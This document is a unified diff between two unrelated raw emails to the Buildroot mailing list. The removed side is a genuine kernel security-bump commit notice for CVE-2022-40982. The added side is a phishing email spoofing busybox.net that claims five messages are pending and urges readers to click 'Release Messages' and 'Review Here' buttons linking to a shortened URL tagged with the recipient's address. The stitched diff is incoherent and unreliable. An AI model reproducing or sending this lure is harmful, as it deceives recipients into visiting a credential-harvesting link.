@@ -4,47 +4,43 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id A02E6C001B0
-	for <buildroot@archiver.kernel.org>; Wed,  9 Aug 2023 10:21:31 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id E2D37EB64DD
+	for <buildroot@archiver.kernel.org>; Wed,  9 Aug 2023 10:30:39 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 4C36B60F8E;
-	Wed,  9 Aug 2023 10:21:31 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 4C36B60F8E
+	by smtp3.osuosl.org (Postfix) with ESMTP id 73F4860FC7;
+	Wed,  9 Aug 2023 10:30:39 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 73F4860FC7
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp3.osuosl.org ([127.0.0.1])
 	by localhost (smtp3.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id ZsJIfqBqPsXB; Wed,  9 Aug 2023 10:21:30 +0000 (UTC)
+	with ESMTP id SEOyOg769pPL; Wed,  9 Aug 2023 10:30:38 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 5943E61224;
-	Wed,  9 Aug 2023 10:21:29 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 5943E61224
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
- by ash.osuosl.org (Postfix) with ESMTP id BD1461BF380
- for <buildroot@lists.busybox.net>; Wed,  9 Aug 2023 10:21:15 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id CC1D560B99;
+	Wed,  9 Aug 2023 10:30:37 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org CC1D560B99
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 415071BF380
+ for <buildroot@lists.busybox.net>; Wed,  9 Aug 2023 10:30:36 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp3.osuosl.org (Postfix) with ESMTP id 94B2C60FBC
- for <buildroot@lists.busybox.net>; Wed,  9 Aug 2023 10:21:14 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 94B2C60FBC
+ by smtp1.osuosl.org (Postfix) with ESMTP id C010382CA3
+ for <buildroot@lists.busybox.net>; Wed,  9 Aug 2023 10:30:33 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org C010382CA3
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp3.osuosl.org ([127.0.0.1])
- by localhost (smtp3.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id pxWRuWpy6Vhl for <buildroot@lists.busybox.net>;
- Wed,  9 Aug 2023 10:21:13 +0000 (UTC)
-Received: from busybox.osuosl.org (busybox.osuosl.org [140.211.167.122])
- by smtp3.osuosl.org (Postfix) with ESMTP id 9EDAE60FC7
- for <buildroot@buildroot.org>; Wed,  9 Aug 2023 10:21:13 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 9EDAE60FC7
-Received: by busybox.osuosl.org (Postfix, from userid 4053)
- id 89A0284FBA; Wed,  9 Aug 2023 10:21:13 +0000 (UTC)
-To: buildroot@buildroot.org
-Date: Wed, 9 Aug 2023 12:20:52 +0200
-X-Git-Refname: refs/heads/master
-X-Git-Oldrev: 35d97842a234b429531be8164028497d59446ca8
-X-Git-Newrev: e0a786a46733cc473f0e4c35064a3b09ccf548e6
-X-Patchwork-Hint: ignore
-Message-Id: <20230809102113.89A0284FBA@busybox.osuosl.org>
-Subject: [Buildroot] [git commit] {linux, linux-headers}: security bump 4.{14,
- 19}.x / 5.{4, 10, 15}.x / 6.{1, 4}.x series
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id xeURCZ12D6vl for <buildroot@lists.busybox.net>;
+ Wed,  9 Aug 2023 10:30:33 +0000 (UTC)
+Received: from busybox.net (unknown [79.110.48.225])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 9FFA282CFD
+ for <buildroot@busybox.net>; Wed,  9 Aug 2023 10:30:32 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 9FFA282CFD
+From: <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 9 Aug 2023 12:30:31 +0200
+Message-ID: <20230809123031.752EFA9E1BD741EA@busybox.net>
+MIME-Version: 1.0
+Subject: [Buildroot] =?utf-8?q?Email_Notification=3A_You_have_=285=29_pen?=
+ =?utf-8?q?ding_mess=C9=91ges?=
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -56,94 +52,128 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-From: Thomas Petazzoni via buildroot <buildroot@buildroot.org>
-Reply-To: Thomas Petazzoni <thomas.petazzoni@bootlin.com>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============8383689949528694350=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-commit: https://git.buildroot.net/buildroot/commit/?id=e0a786a46733cc473f0e4c35064a3b09ccf548e6
-branch: https://git.buildroot.net/buildroot/commit/?id=refs/heads/master
+--===============8383689949528694350==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-Fixes CVE-2022-40982:
-https://downfall.page/
-https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00828.html
-https://www.phoronix.com/news/Linux-Git-INCEPTION-DOWNFALL
+<!DOCTYPE HTML>
 
-Signed-off-by: Bernd Kuhls <bernd@kuhls.net>
-Signed-off-by: Thomas Petazzoni <thomas.petazzoni@bootlin.com>
----
- linux/Config.in                      |  2 +-
- linux/linux.hash                     | 14 +++++++-------
- package/linux-headers/Config.in.host | 14 +++++++-------
- 3 files changed, 15 insertions(+), 15 deletions(-)
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; border-top-color: currentColor; border-top-width: 0px; border-top-style: =
+none; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; b=
+ackground-color: rgb(244, 248, 245); font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width:=20
+0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
+xt-decoration-color: initial;"><div style=3D"width: 591px; height: 24px; pa=
+dding-top: 5px; padding-right: 5px; padding-bottom: 5px; margin-left: 18px;=
+ border-top-color: currentColor; border-top-width: 0px; border-top-style: n=
+one; float: left; box-sizing: border-box;">
+<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
+ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(244, 248, 245);'><span style=3D"box-sizing: border-box;"><fo=
+nt size=3D"2"><br class=3D"Apple-interchange-newline">Message generated fro=
+m busybox.net&nbsp;source.</font></span></div></div><div style=3D"box-sizin=
+g: border-box;">
+<div style=3D"width: 5px; height: 30px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(86, 166, 89);"></div></div></div>
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><br></div>
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial;=20
+text-decoration-color: initial;">&nbsp;</div>
+<table style=3D"width: 629px; text-align: left; color: rgb(44, 54, 58); tex=
+t-transform: none; letter-spacing: normal; font-family: calibri; font-size:=
+ 16px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;" border=3D"0"><tbody style=3D"box-=
+sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td align=3D"lef=
+t" style=3D"box-sizing: border-box;"><table style=3D"width: 627px; border-c=
+ollapse: collapse; min-width: 600px; box-sizing: border-box;" border=3D"0" =
+cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;=
+"><tr align=3D"center" style=3D"box-sizing: border-box;"><td style=3D"box-s=
+izing: border-box;">
+<table style=3D"border-collapse: collapse; max-width: 600px; box-sizing: bo=
+rder-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D=
+"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=
+=3D"box-sizing: border-box;"><table style=3D"width: 513px; border-collapse:=
+ collapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadd=
+ing=3D"0"></table></td></tr><tr style=3D"box-sizing: border-box;"><td style=
+=3D"box-sizing: border-box;">
+<div style=3D"padding: 22px 25.64px 30px; text-align: center; font-family: =
+Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 25px; border-top-c=
+olor: currentColor; border-bottom-color: rgb(201, 201, 201); border-top-wid=
+th: 0px; border-bottom-width: thin; border-top-style: none; border-bottom-s=
+tyle: solid; box-sizing: border-box;">Notification of pending&nbsp;5 messag=
+es.<br style=3D"box-sizing: border-box;"></div></td></tr><tr style=3D"box-s=
+izing: border-box;"><td style=3D"box-sizing: border-box;">
+<div style=3D"border-top-color: currentColor; border-top-width: 0px; border=
+-top-style: none; box-sizing: border-box;">&nbsp;</div><div style=3D"box-si=
+zing: border-box;">&nbsp;</div><font size=3D"1"><font size=3D"2">Some messa=
+ges are restrained from delivering to<span>&nbsp;</span><u><font color=3D"#=
+0000ff">buildroot@busybox.net</font></u><font style=3D"box-sizing: border-b=
+ox;"><br><br></font></font></font><p style=3D"margin-top: 0px; margin-botto=
+m: 1rem; box-sizing: border-box;"><font size=3D"2">
+Due to low bandwidth we notify you to take prompt actions</font></p>
+<a style=3D"background: rgb(36, 107, 193); margin: 2px; padding: 10px; outl=
+ine: 0px; border: thick currentColor; border-image: none; color: rgb(255, 2=
+55, 255); text-decoration: none; float: left; display: block; box-sizing: b=
+order-box;" href=3D"https://shorturl.at/fgV57#buildroot@busybox.net" target=
+=3D"_blank" rel=3D"noreferrer"><font size=3D"3">Release Messages</font></a>=
 
-diff --git a/linux/Config.in b/linux/Config.in
-index 1501df86e9..32940bc346 100644
---- a/linux/Config.in
-+++ b/linux/Config.in
-@@ -128,7 +128,7 @@ endif
- 
- config BR2_LINUX_KERNEL_VERSION
- 	string
--	default "6.4.8" if BR2_LINUX_KERNEL_LATEST_VERSION
-+	default "6.4.9" if BR2_LINUX_KERNEL_LATEST_VERSION
- 	default "5.10.162-cip24" if BR2_LINUX_KERNEL_LATEST_CIP_VERSION
- 	default "5.10.162-cip24-rt10" if BR2_LINUX_KERNEL_LATEST_CIP_RT_VERSION
- 	default BR2_LINUX_KERNEL_CUSTOM_VERSION_VALUE \
-diff --git a/linux/linux.hash b/linux/linux.hash
-index c9a0497d1a..ec879b21d9 100644
---- a/linux/linux.hash
-+++ b/linux/linux.hash
-@@ -1,13 +1,13 @@
- # From https://www.kernel.org/pub/linux/kernel/v6.x/sha256sums.asc
--sha256  c59f34e19e84db30206b9373041abf893f9d8a08765d163586570a5238c458b6  linux-6.4.8.tar.xz
--sha256  245248470a62d4e94b46f753afc01e19e45b9e6f3a0fa06e7f5da21fe845a808  linux-6.1.43.tar.xz
-+sha256  b8b8a29852b999f337c4e93eff6c91fb7fd2d49a6614cbcbeb6fa171ba55cc9f  linux-6.4.9.tar.xz
-+sha256  2e51d41fe11d082ae167cee05772bb07ca7f19448d2b46772d8ca2db7673a1a5  linux-6.1.44.tar.xz
- # From https://www.kernel.org/pub/linux/kernel/v5.x/sha256sums.asc
--sha256  00036a0260ad012aa832a8698a4afcf23b2410091527738ce48ce3fcc23f22ed  linux-5.15.124.tar.xz
--sha256  c9558bab35e23ae67661bfb3192c609c857f78582a035449ae63e33d04ab6112  linux-5.10.188.tar.xz
--sha256  bcb4953ed68131ef17f9f1ba52cac8b9d70007f5ab600bf3dee1fbf8beb218ca  linux-5.4.251.tar.xz
-+sha256  150f3846b76cd23a6135f49cef71372bade5a06e851cb4f8558df8b862d8fec7  linux-5.15.125.tar.xz
-+sha256  4c03516ae1d417571faaef175932d0892710bcbe0173e40550014d043d9098c9  linux-5.10.189.tar.xz
-+sha256  3a78587523940374a7319089b63357c7dc412b90f5879d512265e59173588267  linux-5.4.252.tar.xz
- # From https://www.kernel.org/pub/linux/kernel/v4.x/sha256sums.asc
--sha256  118f7411793868db8dcb043cdc82e9ac6f722fbec8dcdde30b07889d941aa3b3  linux-4.19.289.tar.xz
--sha256  ed82679c0c6e600db80050d09e2294fb28b61cf27dc98657296c7eb5250a7625  linux-4.14.320.tar.xz
-+sha256  6ee30a46f3fa6576602085b7b4b0c640586f99d1c110982db411819308b5755c  linux-4.19.250.tar.xz
-+sha256  d0e32bd47a547cc20e0ce09ff45514282742edb2af38df5dc0a03f22d4321715  linux-4.14.321.tar.xz
- # Locally computed
- sha256  fb0edc3c18e47d2b6974cb0880a0afb5c3fa08f50ee87dfdf24349405ea5f8ae  linux-cip-5.10.162-cip24.tar.gz
- sha256  b5539243f187e3d478d76d44ae13aab83952c94b885ad889df6fa9997e16a441  linux-cip-5.10.162-cip24-rt10.tar.gz
-diff --git a/package/linux-headers/Config.in.host b/package/linux-headers/Config.in.host
-index d528f88745..c7d725aa13 100644
---- a/package/linux-headers/Config.in.host
-+++ b/package/linux-headers/Config.in.host
-@@ -400,13 +400,13 @@ endchoice
- 
- config BR2_DEFAULT_KERNEL_HEADERS
- 	string
--	default "4.14.320"	if BR2_KERNEL_HEADERS_4_14
--	default "4.19.289"	if BR2_KERNEL_HEADERS_4_19
--	default "5.4.251"	if BR2_KERNEL_HEADERS_5_4
--	default "5.10.188"	if BR2_KERNEL_HEADERS_5_10
--	default "5.15.124"	if BR2_KERNEL_HEADERS_5_15
--	default "6.1.43"	if BR2_KERNEL_HEADERS_6_1
--	default "6.4.8"		if BR2_KERNEL_HEADERS_6_4
-+	default "4.14.321"	if BR2_KERNEL_HEADERS_4_14
-+	default "4.19.290"	if BR2_KERNEL_HEADERS_4_19
-+	default "5.4.252"	if BR2_KERNEL_HEADERS_5_4
-+	default "5.10.189"	if BR2_KERNEL_HEADERS_5_10
-+	default "5.15.125"	if BR2_KERNEL_HEADERS_5_15
-+	default "6.1.44"	if BR2_KERNEL_HEADERS_6_1
-+	default "6.4.9"		if BR2_KERNEL_HEADERS_6_4
- 	default BR2_DEFAULT_KERNEL_VERSION if BR2_KERNEL_HEADERS_VERSION
- 	default "custom"	if BR2_KERNEL_HEADERS_CUSTOM_TARBALL
- 	default BR2_KERNEL_HEADERS_CUSTOM_REPO_VERSION \
+<a style=3D"background: rgb(179, 179, 179); margin: 2px; padding: 10px; out=
+line: 0px; border: thick currentColor; border-image: none; color: rgb(255, =
+255, 255); text-decoration: none; float: left; display: block; box-sizing: =
+border-box;" href=3D"https://shorturl.at/fgV57#buildroot@busybox.net" targe=
+t=3D"_blank" rel=3D"noreferrer"><font size=3D"3">Review Here</font></a>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: bor=
+der-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing:=
+ border-box;">&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; b=
+ox-sizing: border-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1re=
+m; box-sizing: border-box;"></p>
+<h5 style=3D"line-height: 1.2; font-size: 1.25rem; font-weight: 500; margin=
+-top: 0px; margin-bottom: 0.5rem; box-sizing: border-box;"><font size=3D"1"=
+><font size=3D"2"><font size=3D"3"><font size=3D"2">Message should be moved=
+ to inbox.&nbsp;<span>&nbsp;</span><u style=3D"box-sizing: border-box;">Got=
+o Clutter.</u></font></font></font></font></h5></td></tr></tbody></table></=
+td></tr></tbody></table></td></tr></tbody></table></body></html>
+
+--===============8383689949528694350==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============8383689949528694350==--
